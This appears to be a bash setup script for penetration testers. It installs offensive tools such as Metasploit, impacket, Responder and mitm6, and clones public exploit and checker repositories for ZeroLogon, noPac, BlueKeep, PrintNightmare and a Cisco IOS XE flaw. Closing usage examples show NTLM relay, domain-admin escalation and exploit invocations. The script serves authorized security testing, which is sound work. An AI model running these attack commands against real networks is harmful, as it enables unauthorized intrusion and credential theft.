#!/bin/bash
# onsite.sh — standard checks and tools for client-site engagements.
# For general attack box setup, see attackbox.sh.

if [[ $EUID -ne 0 ]]; then
    echo 'Run with sudo. (Need sudo? usermod -aG sudo <username>)'
    exit 1
fi

TARGET_USER=${SUDO_USER:-$(logname)}
TARGET_HOME=$(getent passwd "$TARGET_USER" | cut -d: -f6)
TOOLS_DIR="$TARGET_HOME/tools"

as_user() { su - "$TARGET_USER" -c "export PATH=\"$TARGET_HOME/.local/bin:$TARGET_HOME/go/bin:/usr/lib/go/bin:\$PATH\" && $1"; }

mkdir -p "$TOOLS_DIR"
chown "$TARGET_USER:$TARGET_USER" "$TOOLS_DIR"

echo "=== System packages ==="
apt update
apt install -y nmap git python3 python3-venv python3-dev build-essential curl wget unzip pipx

echo "=== Metasploit ==="
if ! command -v msfconsole &>/dev/null; then
    echo "[!] metasploit-framework not found."
    read -p "    Install now? [y/N] " yn
    if [[ "$yn" =~ ^[Yy]$ ]]; then
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
        chmod +x /tmp/msfinstall
        /tmp/msfinstall
        rm -f /tmp/msfinstall
    fi
fi

echo "=== pipx tools ==="
as_user "pipx ensurepath"
as_user "pipx install --force git-dumper"
as_user "pipx install --force git+https://github.com/garrettfoster13/pre2k"
as_user "pipx install --force mitm6"
as_user "pipx install --force impacket"

echo "=== nuclei ==="
if ! command -v nuclei &>/dev/null; then
    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64)  ARCH="amd64" ;;
        aarch64) ARCH="arm64" ;;
    esac
    OS=$(uname -s | tr '[:upper:]' '[:lower:]')
    NUCLEI_URL=$(curl -sL https://api.github.com/repos/projectdiscovery/nuclei/releases/latest \
        | grep "browser_download_url.*${OS}_${ARCH}.zip\"" | head -1 | cut -d '"' -f 4)
    if [ -z "$NUCLEI_URL" ]; then
        echo "[!] Could not resolve nuclei download URL — install manually:"
        echo "    https://github.com/projectdiscovery/nuclei/releases/latest"
    else
        echo "[*] Downloading nuclei from $NUCLEI_URL"
        curl -sL "$NUCLEI_URL" -o /tmp/nuclei.zip
        unzip -o /tmp/nuclei.zip -d /tmp/nuclei_bin
        mv /tmp/nuclei_bin/nuclei /usr/local/bin/
        rm -rf /tmp/nuclei.zip /tmp/nuclei_bin
    fi
fi
as_user "nuclei -update-templates" || true

echo "=== CVE-2023-20198 ==="
[ -d "$TOOLS_DIR/CVE-2023-20198" ] || git clone https://github.com/smokeintheshell/CVE-2023-20198.git "$TOOLS_DIR/CVE-2023-20198"
python3 -m venv "$TOOLS_DIR/CVE-2023-20198/.venv"
"$TOOLS_DIR/CVE-2023-20198/.venv/bin/pip" install requests 2>/dev/null || true

echo "=== ItWasAllADream ==="
[ -d "$TOOLS_DIR/ItWasAllADream" ] || git clone https://github.com/byt3bl33d3r/ItWasAllADream.git "$TOOLS_DIR/ItWasAllADream"
python3 -m venv "$TOOLS_DIR/ItWasAllADream/.venv"
"$TOOLS_DIR/ItWasAllADream/.venv/bin/pip" install impacket
if ! "$TOOLS_DIR/ItWasAllADream/.venv/bin/pip" install "$TOOLS_DIR/ItWasAllADream/" 2>/dev/null; then
    echo "[!] ItWasAllADream project install failed (poetry backend). Deps installed; run manually:"
    echo "    cd $TOOLS_DIR/ItWasAllADream && .venv/bin/python -m itwasalladream ..."
fi

echo "=== mitm6 ==="
# (installed via pipx above)

echo "=== impacket (upstream, for ntlmrelayx) ==="
# (installed via pipx above)

echo "=== BlueKeep ==="
[ -d "$TOOLS_DIR/detect_bluekeep" ] || git clone https://github.com/blacklanternsecurity/detect_bluekeep.py.git "$TOOLS_DIR/detect_bluekeep"
python3 -m venv "$TOOLS_DIR/detect_bluekeep/.venv"
"$TOOLS_DIR/detect_bluekeep/.venv/bin/pip" install impacket 2>/dev/null || true

echo "=== ZeroLogon ==="
[ -d "$TOOLS_DIR/CVE-2020-1472" ] || git clone https://github.com/bvcyber/CVE-2020-1472.git "$TOOLS_DIR/CVE-2020-1472"
python3 -m venv "$TOOLS_DIR/CVE-2020-1472/.venv"
"$TOOLS_DIR/CVE-2020-1472/.venv/bin/pip" install impacket 2>/dev/null || true

echo "=== noPac ==="
[ -d "$TOOLS_DIR/noPac" ] || git clone https://github.com/Ridter/noPac.git "$TOOLS_DIR/noPac"
python3 -m venv "$TOOLS_DIR/noPac/.venv"
"$TOOLS_DIR/noPac/.venv/bin/pip" install -r "$TOOLS_DIR/noPac/requirements.txt" || true

echo "=== Responder ==="
[ -d "$TOOLS_DIR/Responder" ] || git clone https://github.com/lgandx/Responder.git "$TOOLS_DIR/Responder"
python3 -m venv "$TOOLS_DIR/Responder/.venv"
if [ -f "$TOOLS_DIR/Responder/requirements.txt" ]; then
    "$TOOLS_DIR/Responder/.venv/bin/pip" install -r "$TOOLS_DIR/Responder/requirements.txt" || true
fi

chown -R "$TARGET_USER:$TARGET_USER" "$TOOLS_DIR"

echo ""
echo "========================================="
echo "=== Verify ==="
echo "========================================="
echo -n "nmap:           "; command -v nmap &>/dev/null && nmap --version 2>/dev/null | head -1 || echo "MISSING"
echo -n "msfconsole:     "; command -v msfconsole &>/dev/null && echo "OK" || echo "MISSING — install manually (see above)"
echo -n "nuclei:         "; command -v nuclei &>/dev/null && nuclei --version 2>&1 | head -1 || echo "MISSING"
echo -n "git-dumper:     "; as_user "command -v git-dumper" &>/dev/null && echo "OK" || echo "MISSING"
echo -n "pre2k:          "; as_user "command -v pre2k" &>/dev/null && echo "OK" || echo "MISSING"
echo -n "mitm6:          "; as_user "command -v mitm6" &>/dev/null && echo "OK" || echo "MISSING"
echo -n "ntlmrelayx:     "; as_user "command -v ntlmrelayx.py" &>/dev/null && echo "OK" || echo "MISSING"
echo -n "BlueKeep:       "; [ -f "$TOOLS_DIR/detect_bluekeep/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
echo -n "ZeroLogon:      "; [ -f "$TOOLS_DIR/CVE-2020-1472/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
echo -n "noPac:          "; [ -f "$TOOLS_DIR/noPac/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
echo -n "Responder:      "; [ -f "$TOOLS_DIR/Responder/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
echo -n "ItWasAllADream: "; [ -f "$TOOLS_DIR/ItWasAllADream/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
echo -n "CVE-2023-20198: "; [ -f "$TOOLS_DIR/CVE-2023-20198/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"

echo ""
echo "Tools installed to: $TOOLS_DIR"
echo ""
echo "========================================="
echo "Add these aliases to your .zshrc (or .bashrc) and source it:"
echo "========================================="
echo ""
cat <<'ALIASES'
# Pentest Tools
alias Responder='sudo ~/tools/Responder/.venv/bin/python ~/tools/Responder/Responder.py'
alias itwasalladream='~/tools/ItWasAllADream/.venv/bin/itwasalladream'
alias noPac='~/tools/noPac/.venv/bin/python ~/tools/noPac/noPac.py'
alias bluekeep='~/tools/detect_bluekeep/.venv/bin/python ~/tools/detect_bluekeep/detect_bluekeep.py'
alias zerologon='~/tools/CVE-2020-1472/.venv/bin/python ~/tools/CVE-2020-1472/zerologon_tester.py'
alias cve-2023-20198='~/tools/CVE-2023-20198/.venv/bin/python ~/tools/CVE-2023-20198/exploit.py'
ALIASES

echo ""
echo "========================================="
echo "Usage examples:"
echo "========================================="
cat <<'USAGE'

# ItWasAllADream (PrintNightmare check)
itwasalladream -u <user> -p <pass> -d <domain> <targets>
# or via Docker:
# docker run -v "$(pwd)":/app itwasalladream -u <user> -p <pass> -d <domain> /app/445s.txt

# mitm6 + ntlmrelayx (IPv6 DNS takeover → NTLM relay)
sudo mitm6 -d <domain>
# In a second terminal:
ntlmrelayx.py -6 -t ldaps://<dc-ip> -wh <attacker-ip> -l loot

# BlueKeep (CVE-2019-0708 — detection only)
bluekeep <IP or range>

# ZeroLogon (CVE-2020-1472 — test only, no exploit)
zerologon <DC-NAME> <DC-IP>

# noPac (CVE-2021-42278/42287 — domain user → domain admin)
noPac <domain.com>/<user>:'<password>' -dc-ip <dc-ip>

# Responder (passive LLMNR/NBT-NS check)
Responder -I <interface>

# CVE-2023-20198 (Cisco IOS XE)
cve-2023-20198 -t <target> -c

USAGE
